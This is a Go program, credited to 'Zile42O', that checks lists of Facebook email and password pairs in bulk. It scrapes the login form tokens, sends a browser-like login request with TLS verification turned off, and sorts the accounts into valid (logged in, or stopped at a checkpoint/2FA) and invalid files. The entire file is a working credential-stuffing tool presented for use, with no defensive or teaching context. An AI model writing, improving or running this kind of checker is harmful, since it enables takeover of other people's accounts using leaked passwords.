package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"golang.org/x/net/html"
)

const (
	// Separators
	separatorExport = "|" // separator for exporting
	separatorImport = "|" // separator for importing data

	// User Agent
	requestUA = "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

	// Files
	accountsCheck   = "check.txt"
	accountsValid   = "valid.txt"
	accountsInvalid = "invalid.txt"
)

func main() {
	startTime := time.Now()

	color.Red("\n\n----------------------")
	color.Cyan("Starting...")
	accounts, err := loadAccounts(accountsCheck)
	if err != nil {
		color.Red("Failed, cannot read check file, error: %s", err)
		return
	}
	var count = 0
	for _, acc := range accounts {
		status := checkLogin(acc[0], acc[1])
		switch status {
		case "login_ok":
			color.Green("[+] %s (logged in)", acc[0])
			appendToFile(accountsValid, fmt.Sprintf("%s%s%s", acc[0], separatorExport, acc[1]))
		case "login_cp":
			color.Yellow("[+] %s (checkpoint/2FA)", acc[0])
			appendToFile(accountsValid, fmt.Sprintf("%s%s%s", acc[0], separatorExport, acc[1]))
		default:
			color.Red("[-] %s (failed)", acc[0])
			appendToFile(accountsInvalid, fmt.Sprintf("%s%s%s", acc[0], separatorExport, acc[1]))
		}
		count++
	}
	if count < 1 {
		color.Red("No results")
	}
	color.Cyan("Program finished..")
	color.Red("----------------------")
	color.Cyan("\n\nBy Zile42O")

	endTime := time.Now()
	elapsedTime := endTime.Sub(startTime)

	fmt.Printf("Program took: %d:%02d\n", int(elapsedTime.Minutes()), int(elapsedTime.Seconds())%60)
}

// Append to file
func appendToFile(filename, link string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		color.Red("Error while append to file, error: %s", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(link + "\n"); err != nil {
		color.Red("Error while writing to file, error: %s", err)
	}
}

// Load Accounts
func loadAccounts(filename string) ([][2]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var accountList [][2]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, separatorImport)
		if len(parts) == 2 {
			account := [2]string{strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])}
			accountList = append(accountList, account)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return accountList, nil
}

// Check log
func checkLogin(facebookEmail string, facebookPassword string) string {
	cookieJar, _ := cookiejar.New(nil)

	client := &http.Client{
		Jar: cookieJar,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Setup the request
	baseUrl, _ := url.Parse("https://mbasic.facebook.com/")
	request, _ := http.NewRequest("GET", baseUrl.String(), nil)
	request.Header.Set("Host", request.URL.Host)
	request.Header.Set("User-Agent", requestUA)
	request.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	request.Header.Set("Accept-Language", "en-US,en;q=1.0")
	request.Header.Set("Connection", "close")
	request.Header.Set("Upgrade-Insecure-Requests", "1")

	resp_get, _ := client.Do(request)
	defer resp_get.Body.Close()

	body, _ := io.ReadAll(resp_get.Body)

	htmlValues, err := extractValuesFromHTML(string(body))
	if err != nil {
		fmt.Println("Error parsing HTML:", err)
		return "extract_err"
	}

	lsd := htmlValues["lsd"]
	jazoest := htmlValues["jazoest"]
	li := htmlValues["li"]
	m_ts := htmlValues["m_ts"]
	bi_xrwh := htmlValues["bi_xrwh"]

	// Setup the POST data like 'normal' login
	postFields := url.Values{
		"lsd":                {lsd},
		"jazoest":            {jazoest},
		"email":              {facebookEmail},
		"unrecognized_tries": {"0"},
		"bi_xrwh":            {bi_xrwh},
		"li":                 {li},
		"m_ts":               {m_ts},
		"try_number":         {"0"},
		"login":              {"Log in"},
		"pass":               {facebookPassword},
	}

	// Sending request to facebook endpoint
	req_post, _ := http.NewRequest("POST", "https://mbasic.facebook.com/login/device-based/regular/login/", strings.NewReader(postFields.Encode()))
	req_post.Header.Set("Host", req_post.URL.Host)
	req_post.Header.Set("User-Agent", requestUA)
	req_post.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req_post.Header.Set("Accept-Language", "en-US,en;q=1.0")
	req_post.Header.Set("Connection", "close")
	req_post.Header.Set("Upgrade-Insecure-Requests", "1")
	req_post.Header.Set("Content-Type", "application/x-www-form-urlencoded;")
	req_post.Header.Set("Content-Length", strconv.Itoa(len(postFields.Encode())))
	req_post.Header.Set("Origin", req_post.URL.String())

	client.CheckRedirect = func(request *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	resp_post, _ := client.Do(req_post)
	defer resp_post.Body.Close()

	// Now we have the response and let's process it
	var cUserFound, checkpointFound bool
	for _, cookie := range resp_post.Cookies() {
		if cookie.Name == "c_user" && cookie.Value != "" {
			cUserFound = true
		} else if cookie.Name == "checkpoint" && cookie.Value != "" {
			checkpointFound = true
		}
	}

	if cUserFound {
		return "login_ok"
	} else if checkpointFound {
		return "login_cp"
	} else {
		return "login_invalid"
	}
}

// Extract HTML
func extractValuesFromHTML(htmlContent string) (map[string]string, error) {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		return nil, err
	}

	values := make(map[string]string)

	var findValues func(*html.Node)
	findValues = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "input" {
			name, ok := getAttributeValue(n, "name")
			if ok {
				value, _ := getAttributeValue(n, "value")
				values[name] = value
			}
		}

		for c := n.FirstChild; c != nil; c = c.NextSibling {
			findValues(c)
		}
	}

	findValues(doc)
	return values, nil
}

func getAttributeValue(n *html.Node, attributeName string) (string, bool) {
	for _, attr := range n.Attr {
		if attr.Key == attributeName {
			return attr.Val, true
		}
	}
	return "", false
}
